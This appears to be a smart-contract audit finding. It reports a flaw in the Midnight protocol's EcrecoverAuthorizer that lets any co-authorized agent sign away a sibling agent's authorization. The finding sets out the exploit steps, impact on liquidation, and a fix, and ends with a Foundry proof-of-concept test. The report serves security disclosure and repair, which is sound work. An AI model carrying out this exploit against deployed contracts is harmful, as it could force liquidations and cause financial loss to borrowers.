### Title
Co-authorized agent can deauthorize sibling agents via EcrecoverAuthorizer - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any agent already authorized by the `authorization.authorizer`, not only from the authorizer themselves. This means any co-authorized agent can sign an `Authorization` struct that sets `isAuthorized=false` for a sibling agent and submit it permissionlessly, revoking that agent's access without the principal's knowledge or consent.

### Finding Description

**Exact code path:**

`EcrecoverAuthorizer.setIsAuthorized` (lines 24–48) performs this signer check:

```solidity
require(
    signer == authorization.authorizer
        || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
``` [1](#0-0) 

If the recovered signer is any address for which `isAuthorized[authorization.authorizer][signer] == true`, the check passes. The function then calls:

```solidity
IMidnight(MIDNIGHT).setIsAuthorized(
    authorization.authorized, authorization.isAuthorized, authorization.authorizer
);
``` [2](#0-1) 

`Midnight.setIsAuthorized` in turn checks:

```solidity
require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
isAuthorized[onBehalf][authorized] = newIsAuthorized;
``` [3](#0-2) 

Here `msg.sender` is `EcrecoverAuthorizer`, so the check reduces to `isAuthorized[victim][EcrecoverAuthorizer]`, which is true by precondition.

**Attacker-controlled inputs:**
- `authorization.authorizer` = victim
- `authorization.authorized` = supplyCollateralAgent
- `authorization.isAuthorized` = false
- `authorization.nonce` = current `nonce[victim]` in EcrecoverAuthorizer
- `signature` = attacker's own valid ECDSA signature over the struct

**Exploit flow:**
1. Victim authorizes `EcrecoverAuthorizer`, `attacker`, and `supplyCollateralAgent` in Midnight.
2. Attacker constructs `Authorization{authorizer: victim, authorized: supplyCollateralAgent, isAuthorized: false, nonce: N}` and signs it with their own key.
3. Attacker calls `ecrecoverAuthorizer.setIsAuthorized(auth, sig)` from any address (the function is permissionless to call — no `msg.sender` check).
4. `ecrecover` returns `attacker`; `isAuthorized[victim][attacker] == true` → check passes.
5. `Midnight.setIsAuthorized(supplyCollateralAgent, false, victim)` executes → `isAuthorized[victim][supplyCollateralAgent] = false`.
6. Any subsequent call by `supplyCollateralAgent` to `supplyCollateral(..., onBehalf=victim)` reverts with `Unauthorized`.

**Why existing checks fail:**
The `EcrecoverAuthorizer` check is intended to allow gasless authorization via a trusted delegate, but it conflates "authorized to act on behalf of" with "authorized to modify the authorization set." There is no restriction preventing a co-authorized agent from targeting a sibling agent as `authorization.authorized`. The nonce only prevents replay; it does not prevent a fresh deauthorization transaction. [4](#0-3) 

### Impact Explanation
A borrower whose position is near the LLTV threshold and relies on an authorized `supplyCollateralAgent` to top up collateral is left unable to receive that collateral top-up. The position becomes liquidatable. The attacker pays only gas; the victim suffers liquidation loss. This is a concrete DoS on `supplyCollateral` leading to a liquidatable position.

### Likelihood Explanation
Preconditions are realistic: using an authorized agent for automated collateral management (e.g., a keeper bot) while also authorizing a second agent (e.g., a trading bot or another keeper) is a normal multi-agent setup. The attack is repeatable — after the victim re-authorizes `supplyCollateralAgent`, the attacker can immediately deauthorize again using the next nonce, as long as the attacker remains authorized. The attacker's authorization can only be revoked by the victim directly calling `Midnight.setIsAuthorized` (not via `EcrecoverAuthorizer`, since the attacker could front-run that too).

### Recommendation
Restrict the signer in `EcrecoverAuthorizer.setIsAuthorized` to only the `authorization.authorizer` themselves. Remove the delegated-signer branch entirely:

```solidity
require(signer == authorization.authorizer, Unauthorized());
```

If delegated signing is intentionally desired, introduce a separate, explicitly scoped role (e.g., an `authorizationManager` mapping) that is distinct from the general `isAuthorized` agent set, so that operational agents cannot modify the authorization set.

### Proof of Concept

```solidity
// Foundry unit test
function testCoAuthorizedAgentDeauthorizesSibling() public {
    // Setup: victim authorizes EcrecoverAuthorizer, attacker, and supplyCollateralAgent
    vm.startPrank(victim);
    midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);
    midnight.setIsAuthorized(attacker, true, victim);
    midnight.setIsAuthorized(supplyCollateralAgent, true, victim);
    vm.stopPrank();

    // Confirm supplyCollateralAgent is authorized
    assertTrue(midnight.isAuthorized(victim, supplyCollateralAgent));

    // Attacker builds and signs deauthorization of supplyCollateralAgent
    Authorization memory auth = Authorization({
        authorizer: victim,
        authorized: supplyCollateralAgent,
        isAuthorized: false,
        nonce: ecrecoverAuthorizer.nonce(victim),
        deadline: block.timestamp + 1 days
    });
    Signature memory sig = signAuthorization(auth, attacker); // signed by attacker

    vm.prank(attacker);
    ecrecoverAuthorizer.setIsAuthorized(auth, sig);

    // Assert: supplyCollateralAgent is now deauthorized
    assertFalse(midnight.isAuthorized(victim, supplyCollateralAgent));

    // Assert: supplyCollateralAgent's supplyCollateral on behalf of victim reverts
    vm.prank(supplyCollateralAgent);
    vm.expectRevert(IMidnight.Unauthorized.selector);
    midnight.supplyCollateral(market, 0, collateralAmount, victim);
}
```

Expected assertions: `isAuthorized(victim, supplyCollateralAgent) == false` after the attacker's call; `supplyCollateral` reverts with `Unauthorized`.

### Citations

**File:** src/periphery/EcrecoverAuthorizer.sol (L24-48)
```text
    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );

        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
    }
```

**File:** src/Midnight.sol (L731-733)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
```
